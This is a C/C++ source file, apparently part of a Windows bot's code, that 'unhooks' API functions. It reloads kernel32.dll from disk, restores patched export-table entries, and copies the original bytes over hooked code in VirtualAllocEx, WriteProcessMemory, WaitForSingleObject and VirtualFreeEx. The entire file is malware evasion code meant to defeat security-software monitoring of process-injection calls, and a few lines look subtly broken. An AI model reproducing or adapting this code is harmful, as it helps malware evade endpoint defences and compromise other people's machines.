

#ifndef NO_UNHOOK
#include "bt1.h"

#define makeptr(Base, Increment, Typecast)((Typecast)((ULONG)(Base) + (ULONG)(Increment)))
#define incptr(Base, Increment, Typecast)((Typecast)rvatova((ULONG)(Base), (ULONG)(Increment)))

//RVA To VA
ULONG rvatova(ULONG Base, ULONG Increment)
{
	PIMAGE_NT_HEADERS Nt = makeptr(Base, ((PIMAGE_DOS_HEADER)Base)->e_lfanew, PIMAGE_NT_HEADERS);
	PIMAGE_SECTION_HEADER Sections = makeptr(Nt, sizeof(*Nt), PIMAGE_SECTION_HEADER);
	USHORT SCount = Nt->FileHeader.NumberOfSections;

#ifndef NO_DEBUG
		printf("[DEBUG] Unhooking API, rvatova()...\n");
#endif

	for ( USHORT i = 0; i < SCount; i++ )
	{
		if ((Increment >= Sections[i].VirtualAddress ) && (Increment <= (Sections[i].VirtualAddress + Sections[i].SizeOfRawData)))
		{
				return ((Increment - Sections[i].VirtualAddress) + Sections[i].PointerToRawData + Base);
		}
	}
		return Base + Increment;
}

//Unhook Function, EAT & Extended Overwriting
void unhook(char *szModule, LPSTR lpFunction)
{
	BYTE *Base;
	char MFileName[MAX_PATH], **Names;
	HANDLE hFile;
	HMODULE hModule = GetModuleHandle(szModule);
	MEMORY_BASIC_INFORMATION Info;
	PBYTE FuncHooked;
	PBYTE FuncOriginal = NULL;
	PIMAGE_EXPORT_DIRECTORY Exports;
	PIMAGE_NT_HEADERS Nt;
	ULONG dwTemp, *Functions, OldProtection, RVA, VA;

#ifndef NO_DEBUG
		printf("[DEBUG] Unhooking API, unhook()...\n");
#endif

		GetModuleFileName(hModule, MFileName, sizeof(MFileName));
		hFile = CreateFile(MFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
		dwTemp = GetFileSize( hFile, NULL );
		Base = new BYTE[dwTemp];
		ReadFile(hFile, Base, dwTemp, &dwTemp, NULL);
		CloseHandle(hFile);
		Nt = makeptr(Base, ((PIMAGE_DOS_HEADER)Base)->e_lfanew, PIMAGE_NT_HEADERS);
		Exports = incptr(Base, Nt->OptionalHeader.DataDirectory[0].VirtualAddress, PIMAGE_EXPORT_DIRECTORY);
		FuncHooked = (PBYTE)GetProcAddress(hModule, lpFunction);
		Names = incptr(Base, Exports->AddressOfNames, char **), MFileName[MAX_PATH];
		Functions = incptr(Base, Exports->AddressOfFunctions, ULONG *);
	for ( ULONG i = 0; i < Exports->NumberOfNames;i++ )
	{	
		if (_stricmp(incptr( Base, Names[i], char * ), lpFunction) == 0)
		{
				//protection against export table patching
				RVA = Functions[i];
				VA = (ULONG)GetProcAddress(hModule, lpFunction ) - (ULONG)hModule;
			if (VA != RVA)
			{
					ULONG *EATFunc = makeptr(hModule, makeptr(hModule, makeptr(hModule, ((PIMAGE_DOS_HEADER)hModule)->e_lfanew, PIMAGE_NT_HEADERS)->OptionalHeader.DataDirectory[0].VirtualAddress, PIMAGE_EXPORT_DIRECTORY)->AddressOfFunctions, PULONG);
					EATFunc[i] = RVA;
			}
				FuncOriginal = incptr(Base, Functions[i], PBYTE);
				break;
		}
	}
//protection against extended code overwriting
		VirtualQuery(FuncHooked, &Info, sizeof(Info));
		VirtualProtect(FuncHooked, Info.RegionSize, PAGE_EXECUTE_READWRITE, &OldProtection);
		i = 0;
	while (FuncHooked[i] != FuncOriginal[i])
	{
			FuncHooked[i] = FuncOriginal[i];
			i++;
	}
		delete []Base;
		VirtualProtect(FuncHooked, Info.RegionSize, OldProtection, NULL);
}

//Unhook Functions
void unhook_functions()
{
	if (is_os9x()) return;
	if (!is_osnt()) return;
		unhook("kernel32.dll", "VirtualAllocEx");
		unhook("kernel32.dll", "WriteProcessMemory");
		unhook("kernel32.dll", "WaitForSingleObject");
		unhook("kernel32.dll", "VirtualFreeEx");
		return;
}
#endif